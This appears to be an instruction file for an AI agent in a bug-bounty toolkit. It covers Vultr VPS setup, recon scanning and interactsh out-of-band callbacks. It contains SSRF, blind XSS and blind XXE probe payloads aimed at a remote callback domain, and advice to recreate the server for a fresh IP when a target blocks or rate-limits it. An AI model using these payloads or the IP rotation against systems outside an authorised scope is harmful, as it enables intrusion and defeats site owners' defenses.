---
name: vps
description: |
  Vultr VPS lifecycle management for BountyHound — spin up a clean-IP datacenter instance
  for heavy recon, route slow/IP-burning tool calls to it, run interactsh for OOB callbacks,
  and destroy it when done. Use whenever amass/nuclei/ffuf are running slow locally, when
  your home IP is being throttled or blocked, when you need a public IP for SSRF/blind
  XSS/XXE OOB callbacks, or when you need to leave long recon jobs running overnight.
  Trigger for: "use VPS", "clean IP", "OOB server", "interactsh", "amass is slow",
  "getting blocked", "run overnight".
---
> **TYPOGRAPHY RULE: NEVER use em dashes (--) in any output. Use a hyphen (-) or rewrite the sentence. Em dashes render as â€" on HackerOne.**

## VPS Module Path

```
{AGENT}/engine/vps/vultr.py
```

All commands below call this script directly. The API key is embedded; no additional config needed.

---

## When to Use VPS (Decision Table)

| Situation | Use VPS? |
|-----------|---------|
| amass/subfinder on a large target | YES — takes 20min on VPS vs 2-3hr local |
| nuclei scan on 50+ subdomains | YES — datacenter throughput, parallel scanning |
| ffuf/gobuster on a rate-limiting target | YES — destroy VPS after, fresh IP next attempt |
| Need a public IP for SSRF/blind XSS/XXE callbacks | YES — interactsh on VPS = reliable OOB |
| Quick curl/browser test | NO — use local Chrome + curl |
| SQLi exploitation (sqlmap) | Optional — run locally unless being blocked |
| Recon needs to run overnight unattended | YES — tmux session on VPS persists |
| Target has already blocked your home IP | YES — fresh IP immediately |

---

## Workflow: Start of Hunt

**Check if VPS already running (first):**

```bash
python {AGENT}/engine/vps/vultr.py status --state {FINDINGS}/tmp/vps-state.json 2>/dev/null \
  || echo "NO_VPS"
```

**If no VPS and you need one — spin up:**

```bash
# Creates instance, waits for boot, installs full toolkit (~8 min total)
python {AGENT}/engine/vps/vultr.py start \
  --region syd \
  --plan vc2-1c-2gb \
  --state {FINDINGS}/tmp/vps-state.json
```

Output will show the IP and SSH command. Cost: ~$0.017/hr ($0.10 for a 6-hour hunt).

**Quick start (no provisioning — if you reuse an existing provisioned image):**

```bash
python {AGENT}/engine/vps/vultr.py start --no-provision \
  --state {FINDINGS}/tmp/vps-state.json
```

---

## Running Tools on the VPS

### Subdomain enumeration (amass)

```bash
# Run amass in background tmux session — survives disconnect
python {AGENT}/engine/vps/vultr.py bg amass_enum \
  "amass enum -d {target} -o /bh/findings/amass-{target}.txt -config /dev/null" \
  --state {FINDINGS}/tmp/vps-state.json

# Check if still running
python {AGENT}/engine/vps/vultr.py run \
  "tmux list-sessions && wc -l /bh/findings/amass-{target}.txt 2>/dev/null" \
  --state {FINDINGS}/tmp/vps-state.json

# Download results when done
python {AGENT}/engine/vps/vultr.py download \
  /bh/findings/amass-{target}.txt \
  {FINDINGS}/phases/amass-subdomains.txt \
  --state {FINDINGS}/tmp/vps-state.json
```

### Subfinder (faster than amass for passive enum)

```bash
python {AGENT}/engine/vps/vultr.py run \
  "subfinder -d {target} -o /bh/findings/subfinder-{target}.txt -silent" \
  --state {FINDINGS}/tmp/vps-state.json

python {AGENT}/engine/vps/vultr.py download \
  /bh/findings/subfinder-{target}.txt \
  {FINDINGS}/phases/subfinder-subdomains.txt \
  --state {FINDINGS}/tmp/vps-state.json
```

### Nuclei scan

```bash
# Upload subdomain list first
python {AGENT}/engine/vps/vultr.py upload \
  {FINDINGS}/phases/amass-subdomains.txt \
  /bh/findings/targets.txt \
  --state {FINDINGS}/tmp/vps-state.json

# Run nuclei in background
python {AGENT}/engine/vps/vultr.py bg nuclei_scan \
  "nuclei -l /bh/findings/targets.txt -t http/cves,http/exposures,http/misconfiguration -severity critical,high,medium -o /bh/findings/nuclei-{target}.txt -silent" \
  --state {FINDINGS}/tmp/vps-state.json

# Download results
python {AGENT}/engine/vps/vultr.py download \
  /bh/findings/nuclei-{target}.txt \
  {FINDINGS}/phases/nuclei-results.txt \
  --state {FINDINGS}/tmp/vps-state.json
```

### ffuf (directory fuzzing)

```bash
python {AGENT}/engine/vps/vultr.py run \
  "ffuf -u https://{target}/FUZZ -w /bh/wordlists/directory-list-2.3-medium.txt -mc 200,301,302,403 -o /bh/findings/ffuf-{target}.json -of json -t 50 -rate 100" \
  --state {FINDINGS}/tmp/vps-state.json

python {AGENT}/engine/vps/vultr.py download \
  /bh/findings/ffuf-{target}.json \
  {FINDINGS}/phases/ffuf-results.json \
  --state {FINDINGS}/tmp/vps-state.json
```

### httpx (live host verification + tech fingerprinting)

```bash
python {AGENT}/engine/vps/vultr.py run \
  "cat /bh/findings/targets.txt | httpx -silent -tech-detect -status-code -title -o /bh/findings/httpx-{target}.txt" \
  --state {FINDINGS}/tmp/vps-state.json
```

---

## OOB Callbacks (SSRF / Blind XSS / Blind XXE)

The VPS gives you a public IP for out-of-band interaction detection. This replaces the need for a proxy-based collaborator tool.

**Start interactsh and get your OOB domain:**

```bash
python {AGENT}/engine/vps/vultr.py interactsh \
  --state {FINDINGS}/tmp/vps-state.json
```

Output: `OOB domain: abc123def456.oast.fun`

**Use the domain in payloads:**

```bash
# SSRF test
curl -s "https://{target}/api/fetch?url=http://abc123def456.oast.fun/ssrf-probe"

# Blind XSS (in any input that might be rendered server-side or in admin panel)
# Payload: <script src="//abc123def456.oast.fun/xss.js"></script>

# Blind XXE
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://abc123def456.oast.fun/xxe">]><foo>&xxe;</foo>

# DNS pingback (always works even if HTTP is filtered)
# Use in any URL parameter: http://abc123def456.oast.fun
```

**Poll for interactions:**

```bash
python {AGENT}/engine/vps/vultr.py poll \
  --state {FINDINGS}/tmp/vps-state.json
```

**Interaction = proof.** An HTTP or DNS callback to your OOB domain confirms SSRF, blind XSS, or blind XXE. Screenshot the poll output as evidence.

---

## Direct SSH (for interactive use)

```bash
ssh -i ~/.ssh/bountyhound_vps root@{VPS_IP}

# Or use the vultr.py attach command (reconnects to tmux session)
python {AGENT}/engine/vps/vultr.py attach amass_enum \
  --state {FINDINGS}/tmp/vps-state.json
```

---

## Workflow: End of Hunt

```bash
# Download all findings before destroying
python {AGENT}/engine/vps/vultr.py download \
  /bh/findings/ \
  {FINDINGS}/phases/vps-results/ \
  --state {FINDINGS}/tmp/vps-state.json

# Destroy instance — stops billing immediately
python {AGENT}/engine/vps/vultr.py destroy \
  --state {FINDINGS}/tmp/vps-state.json
```

**Always destroy when done.** Running VPS between hunts costs ~$0.05/hr (A$35/month). Vultr bills by the hour — destroy within the same hour and the cost rounds to the hour minimum.

---

## Overnight Recon

Leave amass + nuclei running while you sleep:

```bash
# Start VPS
python {AGENT}/engine/vps/vultr.py start --state {FINDINGS}/tmp/vps-state.json

# Launch amass in tmux (survives your session closing)
python {AGENT}/engine/vps/vultr.py bg amass_long \
  "amass enum -d {target} -brute -o /bh/findings/amass-full.txt 2>&1 | tee /bh/findings/amass.log" \
  --state {FINDINGS}/tmp/vps-state.json

# Next morning — check status and download
python {AGENT}/engine/vps/vultr.py run \
  "tmux list-sessions; wc -l /bh/findings/amass-full.txt" \
  --state {FINDINGS}/tmp/vps-state.json

python {AGENT}/engine/vps/vultr.py download \
  /bh/findings/amass-full.txt \
  {FINDINGS}/phases/amass-full.txt \
  --state {FINDINGS}/tmp/vps-state.json

python {AGENT}/engine/vps/vultr.py destroy --state {FINDINGS}/tmp/vps-state.json
```

---

## Account Management

```bash
# List all running BountyHound VPS instances (check for forgotten instances billing you)
python {AGENT}/engine/vps/vultr.py list

# List available OS images (to find Ubuntu 22.04 ID if provisioning breaks)
python {AGENT}/engine/vps/vultr.py os
```

---

## Troubleshooting

| Problem | Fix |
|---------|-----|
| `ssh: connect to host ... port 22: Connection refused` | VPS still booting — wait 2 min and retry |
| Provisioning failed partway | SSH in and run `bash /tmp/bh-setup.sh` manually |
| `nuclei: command not found` | Run `export PATH=$PATH:/root/go/bin` on VPS |
| ffuf getting 429 everywhere | Reduce `-rate 100` to `-rate 20`, or destroy and recreate for fresh IP |
| amass taking >3hr | Add `-passive` flag — sacrifices coverage for speed |
| interactsh domain not resolving | Use the IP directly: `http://{VPS_IP}/probe` for SSRF (DNS won't work without a domain) |
